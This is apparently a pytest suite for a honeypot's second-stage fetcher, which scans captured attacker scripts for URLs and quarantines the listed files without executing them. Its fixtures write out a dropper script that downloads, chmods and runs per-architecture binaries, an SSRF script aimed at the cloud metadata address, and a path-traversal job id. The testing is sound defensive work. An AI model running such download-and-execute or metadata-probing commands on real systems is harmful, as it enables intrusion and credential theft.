"""Tests for stage two: fetching the URLs listed inside a captured script.

The script itself is never run -- these tests check that its text is scanned,
that the follow-on fetches go through the normal fetcher, and that the budgets
stop a hostile script being used to aim requests at third parties.
"""
from __future__ import annotations

import asyncio
import json
import struct
import tempfile
from pathlib import Path

import pytest

import honeypot.session.manager as manager_mod
from honeypot.config.schema import (
    CredentialPolicy, FetcherConfig, HoneypotConfig, ListenerConfig, LoggingConfig, PersonaConfig,
)
from honeypot.fetcher.fetcher import FetchResult, fetch_and_quarantine
from honeypot.fetcher.queue import make_job
from honeypot.fetcher.stage2 import Stage2Limiter, plan_followups
from honeypot.fetcher.worker import process_pending
from honeypot.logging.events import EventLogger
from honeypot.session.manager import SessionManager
from tests.test_session import _Server


def _riscv64_elf() -> bytes:
    ident = b"\x7fELF\x02\x01\x01" + b"\x00" * 9
    return ident + struct.pack("<HH", 2, 243) + b"\x00" * 64


@pytest.fixture()
def config(tmp_path) -> HoneypotConfig:
    return HoneypotConfig(
        persona=PersonaConfig(arch="riscv64"),
        listeners=ListenerConfig(),
        credentials=CredentialPolicy(accept_any=True),
        fetcher=FetcherConfig(quarantine_dir=tmp_path / "quarantine", jobs_dir=tmp_path / "jobs",
                              block_private_networks=False),
        logging=LoggingConfig(log_dir=tmp_path / "logs", transcript_dir=tmp_path / "transcripts"),
    )


def _events(config: HoneypotConfig) -> list[dict]:
    path = Path(config.logging.log_dir) / config.logging.json_log_filename
    return [json.loads(line) for line in path.read_text().splitlines() if line.strip()]


def _serve_dropper(directory: Path) -> tuple[_Server, str]:
    """A tiny dropper site: bins.sh lists three per-arch binaries (via a loop)
    plus a tftp line the fetcher does not implement."""
    (directory / "bins").mkdir()
    (directory / "bins" / "x.riscv64").write_bytes(_riscv64_elf())
    (directory / "bins" / "x.arm").write_bytes(b"\x7fELF\x01\x01\x01" + b"\x00" * 9 + struct.pack("<HH", 2, 40) + b"\x00" * 64)
    (directory / "bins" / "x.mips").write_bytes(b"\x7fELF\x01\x02\x01" + b"\x00" * 9 + struct.pack(">HH", 2, 8) + b"\x00" * 64)
    server = _Server(directory)
    base = f"http://127.0.0.1:{server.port}"
    (directory / "bins.sh").write_text(
        "#!/bin/sh\n"
        "cd /tmp || cd /var/run\n"
        f"for a in riscv64 arm mips; do wget {base}/bins/x.$a -O x.$a; chmod +x x.$a; ./x.$a; done\n"
        "tftp -g -r t.sh 127.0.0.1\n"
    )
    return server, base


# -- planner ------------------------------------------------------------------

def _quarantine(config: FetcherConfig, tmp_path: Path, body: bytes) -> tuple[FetchResult, object]:
    path = tmp_path / "sample.bin"
    path.write_bytes(body)
    result = FetchResult(success=True, sha256="ab" * 32, size_bytes=len(body), quarantine_path=str(path))
    return result, make_job("s1", "9.9.9.9", "http://1.2.3.4/bins.sh", "http", "bins.sh", "wget ...")


def test_plan_lists_urls_with_lineage(tmp_path):
    cfg = FetcherConfig()
    result, job = _quarantine(cfg, tmp_path, b"#!/bin/sh\nwget http://1.2.3.4/a.arm\nwget http://1.2.3.4/a.mips\n")
    plan = plan_followups(job, result, cfg, Stage2Limiter())
    assert [j.url for j in plan.jobs] == ["http://1.2.3.4/a.arm", "http://1.2.3.4/a.mips"]
    assert all(j.depth == 1 and j.parent_sha256 == "ab" * 32 and j.session_id == "s1" for j in plan.jobs)
    assert plan.jobs[0].requested_filename == "a.arm"


@pytest.mark.parametrize("body", [_riscv64_elf(), b"", bytes(range(256)) * 10, b"just some words\n"])
def test_plan_is_empty_for_non_scripts_and_scripts_without_downloads(tmp_path, body):
    cfg = FetcherConfig()
    result, job = _quarantine(cfg, tmp_path, body)
    assert plan_followups(job, result, cfg, Stage2Limiter()).jobs == []


def test_plan_respects_disabled_failure_depth_and_size(tmp_path):
    body = b"wget http://1.2.3.4/a\n"
    result, job = _quarantine(FetcherConfig(), tmp_path, body)
    assert plan_followups(job, result, FetcherConfig(stage2_enabled=False), Stage2Limiter()).jobs == []
    assert plan_followups(job, FetchResult(success=False), FetcherConfig(), Stage2Limiter()).jobs == []
    job.depth = 2   # already two levels below the attacker's own request
    assert plan_followups(job, result, FetcherConfig(), Stage2Limiter()).jobs == []
    job.depth = 0
    result.size_bytes = 10_000_000
    assert plan_followups(job, result, FetcherConfig(), Stage2Limiter()).jobs == []


def test_limiter_caps_per_script_per_session_and_dedupes_urls(tmp_path):
    body = "\n".join(f"wget http://1.2.3.4/f{i}" for i in range(50)).encode()
    cfg = FetcherConfig(stage2_max_urls_per_script=10, stage2_max_per_session=15)
    result, job = _quarantine(cfg, tmp_path, body)
    limiter = Stage2Limiter()
    assert len(plan_followups(job, result, cfg, limiter).jobs) == 10
    # Same script again in the same session: every URL is inside the cooldown.
    assert plan_followups(job, result, cfg, limiter).jobs == []
    # A different script from the same session only gets what is left of its budget.
    other, _ = _quarantine(cfg, tmp_path, "\n".join(f"wget http://5.6.7.8/g{i}" for i in range(50)).encode())
    assert len(plan_followups(job, other, cfg, limiter).jobs) == 5


def test_per_host_cap_stops_many_distinct_urls_at_one_target(tmp_path):
    body = "\n".join(f"wget http://victim.example/?q={i}" for i in range(30)).encode()
    cfg = FetcherConfig(stage2_max_per_host=12, stage2_max_per_session=1000, stage2_max_urls_per_script=30)
    limiter = Stage2Limiter()
    result, job = _quarantine(cfg, tmp_path, body)
    assert len(plan_followups(job, result, cfg, limiter).jobs) == 12
    # Different session, different script, same target host: still capped.
    job2 = make_job("other-session", "8.8.8.8", "http://9.9.9.9/x.sh", "http", "x.sh", "wget")
    body2 = "\n".join(f"wget http://victim.example/?z={i}" for i in range(30)).encode()
    result2, _ = _quarantine(cfg, tmp_path, body2)
    assert plan_followups(job2, result2, cfg, limiter).jobs == []
    # ...and another host is unaffected.
    body3 = b"wget http://elsewhere.example/a\n"
    result3, _ = _quarantine(cfg, tmp_path, body3)
    assert len(plan_followups(job2, result3, cfg, limiter).jobs) == 1


def test_limiter_cooldown_expires():
    cfg = FetcherConfig(stage2_dedupe_seconds=100)
    limiter = Stage2Limiter()
    assert limiter.admit("a", ["http://x/1"], cfg, now=0) == ["http://x/1"]
    assert limiter.admit("b", ["http://x/1"], cfg, now=50) == []
    assert limiter.admit("c", ["http://x/1"], cfg, now=150) == ["http://x/1"]


def test_planning_never_raises_on_a_missing_file(tmp_path):
    cfg = FetcherConfig()
    result = FetchResult(success=True, size_bytes=10, quarantine_path=str(tmp_path / "gone"))
    job = make_job("s", "1.1.1.1", "http://x/y", "http", "y", "wget")
    assert plan_followups(job, result, cfg, Stage2Limiter()).jobs == []


# -- end to end: inline mode ---------------------------------------------------

def test_inline_stage_two_fetches_every_binary_the_script_lists(config):
    with tempfile.TemporaryDirectory() as d:
        server, base = _serve_dropper(Path(d))
        try:
            async def scenario() -> str:
                session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config,
                                         EventLogger(config.logging.log_dir, config.logging.json_log_filename))
                output = await session.handle_command(f"wget {base}/bins.sh -O bins.sh")
                await session.wait_stage2()
                return output
            output = asyncio.run(scenario())
        finally:
            server.stop()

    assert "saved" in output   # the attacker got their reply without waiting on stage two
    events = _events(config)
    downloads = [e for e in events if e["event"] == "file.download" and e["outcome"] != "requested"]
    stage1 = [e for e in downloads if "stage" not in e]
    stage2 = [e for e in downloads if e.get("stage") == 2]
    assert len(stage1) == 1 and stage1[0]["detected_type"] == "script"
    assert sorted(e["url"].rsplit("/", 1)[-1] for e in stage2) == ["x.arm", "x.mips", "x.riscv64"]
    assert all(e["outcome"] == "success" and e["parent_sha256"] == stage1[0]["sha256"] for e in stage2)
    riscv = next(e for e in stage2 if e["url"].endswith("riscv64"))
    assert riscv["detected_machine"] == "EM_RISCV" and riscv["arch_mismatch"] is False

    scan = [e for e in events if e["event"] == "file.stage2_scan"]
    assert len(scan) == 1 and scan[0]["urls_found"] == 3 and scan[0]["urls_queued"] == 3 and scan[0]["skipped"] == 1
    assert len(list(Path(config.fetcher.quarantine_dir).glob("*.bin"))) == 4
    # Lineage is recorded next to each sample, too.
    sidecars = [json.loads(p.read_text()) for p in Path(config.fetcher.quarantine_dir).glob("*.json")]
    assert sorted(s["depth"] for s in sidecars) == [0, 1, 1, 1]


def test_inline_repeat_of_the_same_script_does_not_refetch_its_binaries(config):
    """Droppers request the same script several ways in one session (wget,
    busybox wget, curl): the binaries must be fetched once, not once each."""
    with tempfile.TemporaryDirectory() as d:
        server, base = _serve_dropper(Path(d))
        try:
            async def scenario() -> None:
                session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config,
                                         EventLogger(config.logging.log_dir, config.logging.json_log_filename))
                for cmd in ("wget", "busybox wget", "wget"):
                    await session.handle_command(f"{cmd} {base}/bins.sh -O bins.sh")
                await session.wait_stage2()
            asyncio.run(scenario())
        finally:
            server.stop()
    stage2 = [e for e in _events(config)
              if e["event"] == "file.download" and e.get("stage") == 2 and e["outcome"] != "requested"]
    assert len(stage2) == 3


def test_stage_two_can_be_disabled(config):
    config.fetcher.stage2_enabled = False
    with tempfile.TemporaryDirectory() as d:
        server, base = _serve_dropper(Path(d))
        try:
            async def scenario() -> None:
                session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config,
                                         EventLogger(config.logging.log_dir, config.logging.json_log_filename))
                await session.handle_command(f"wget {base}/bins.sh -O bins.sh")
                await session.wait_stage2()
            asyncio.run(scenario())
        finally:
            server.stop()
    assert len(list(Path(config.fetcher.quarantine_dir).glob("*.bin"))) == 1


def test_stage_two_follows_a_script_that_lists_another_script_but_stops_at_max_depth(config):
    config.fetcher.stage2_max_depth = 2
    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        server = _Server(root)
        base = f"http://127.0.0.1:{server.port}"
        (root / "a.sh").write_text(f"wget {base}/b.sh\n")
        (root / "b.sh").write_text(f"wget {base}/c.sh\n")
        (root / "c.sh").write_text(f"wget {base}/d.sh\n")   # depth 3: must not be fetched
        (root / "d.sh").write_text("echo end\n")
        try:
            async def scenario() -> None:
                session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config,
                                         EventLogger(config.logging.log_dir, config.logging.json_log_filename))
                await session.handle_command(f"wget {base}/a.sh")
                await session.wait_stage2()
            asyncio.run(scenario())
        finally:
            server.stop()
    fetched = [e["url"].rsplit("/", 1)[-1] for e in _events(config)
               if e["event"] == "file.download" and e["outcome"] == "success"]
    assert fetched == ["a.sh", "b.sh", "c.sh"]


def test_stage_two_fetches_still_go_through_the_ssrf_guard(config):
    """A script pointing at an internal address must be refused, exactly like
    the same wget typed by the attacker."""
    config.fetcher.block_private_networks = True
    with tempfile.TemporaryDirectory() as d:
        root = Path(d)
        (root / "evil.sh").write_text("wget http://127.0.0.1:1/internal\nwget http://169.254.169.254/latest/meta-data\n")
        server = _Server(root)
        try:
            # The first hop is local too, so fetch it with the guard off and
            # hand the result to the planner/fetcher with the guard on.
            off = FetcherConfig(quarantine_dir=config.fetcher.quarantine_dir, block_private_networks=False)
            job = make_job("s", "1.2.3.4", f"http://127.0.0.1:{server.port}/evil.sh", "http", "evil.sh", "wget")
            result = asyncio.run(fetch_and_quarantine(job, off))
        finally:
            server.stop()
        plan = plan_followups(job, result, config.fetcher, Stage2Limiter())
        assert len(plan.jobs) == 2
        outcomes = [asyncio.run(fetch_and_quarantine(j, config.fetcher)) for j in plan.jobs]
    assert all(not o.success and "blocked non-public destination" in o.error for o in outcomes)


# -- end to end: queued mode (session process never reads the quarantine) -------

def test_queued_stage_two_is_planned_by_the_worker_and_logged_by_the_session(config, monkeypatch):
    monkeypatch.setattr(manager_mod, "_QUEUE_POLL_INTERVAL_SECONDS", 0.02)
    monkeypatch.setattr(manager_mod, "_STAGE2_POLL_INTERVAL_SECONDS", 0.05)
    config.fetcher.mode = "queued"
    with tempfile.TemporaryDirectory() as d:
        server, base = _serve_dropper(Path(d))
        try:
            async def scenario() -> None:
                limiter = Stage2Limiter()
                stop = asyncio.Event()

                async def worker() -> None:
                    while not stop.is_set():
                        await process_pending(config, limiter)
                        await asyncio.sleep(0.02)

                worker_task = asyncio.ensure_future(worker())
                session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config,
                                         EventLogger(config.logging.log_dir, config.logging.json_log_filename))
                # In queued mode the session process must neither fetch nor read a
                # sample: patch the names *its* module uses (the worker, which
                # legitimately does both, imports its own references).
                def forbidden(*a, **kw):
                    raise AssertionError("session process touched the fetcher/quarantine in queued mode")
                monkeypatch.setattr(manager_mod, "plan_followups", forbidden)
                monkeypatch.setattr(manager_mod, "fetch_and_quarantine", forbidden)
                try:
                    output = await session.handle_command(f"wget {base}/bins.sh -O bins.sh")
                    await asyncio.wait_for(session.wait_stage2(), timeout=20)
                finally:
                    stop.set()
                    await worker_task
                assert "saved" in output
            asyncio.run(scenario())
        finally:
            server.stop()

    events = _events(config)
    stage2 = [e for e in events if e["event"] == "file.download" and e.get("stage") == 2]
    assert sorted(e["url"].rsplit("/", 1)[-1] for e in stage2) == ["x.arm", "x.mips", "x.riscv64"]
    assert all(e["outcome"] == "success" for e in stage2)
    assert len([e for e in events if e["event"] == "file.stage2_scan"]) == 1


def test_queued_session_ignores_path_traversal_in_a_fetcher_supplied_job_id(config, tmp_path, monkeypatch):
    """The fetcher is the more exposed container; a job_id in its result must
    not make the session process read files outside .processing/."""
    monkeypatch.setattr(manager_mod, "_STAGE2_POLL_INTERVAL_SECONDS", 0.01)
    config.fetcher.mode = "queued"
    (tmp_path / "secret.result.json").write_text(json.dumps({"success": True, "sha256": "leaked"}))
    parent = FetchResult(success=True, sha256="ab" * 32, stage2_found=1, stage2_jobs=[
        {"job_id": "../../secret", "url": "http://1.2.3.4/x", "protocol": "http",
         "requested_filename": "x", "depth": 1}])
    job = make_job("s", "1.2.3.4", "http://1.2.3.4/bins.sh", "http", "bins.sh", "wget")

    async def scenario() -> None:
        session = SessionManager("1.2.3.4", 5555, 2222, "telnet", config,
                                 EventLogger(config.logging.log_dir, config.logging.json_log_filename))
        session._start_stage2(job, parent)
        await asyncio.wait_for(session.wait_stage2(), timeout=5)
    asyncio.run(scenario())
    outcomes = [e for e in _events(config) if e["event"] == "file.download"]
    assert len(outcomes) == 1 and outcomes[0]["outcome"] == "failed"
    assert outcomes[0]["error"] == "invalid follow-up job id" and outcomes[0]["sha256"] is None
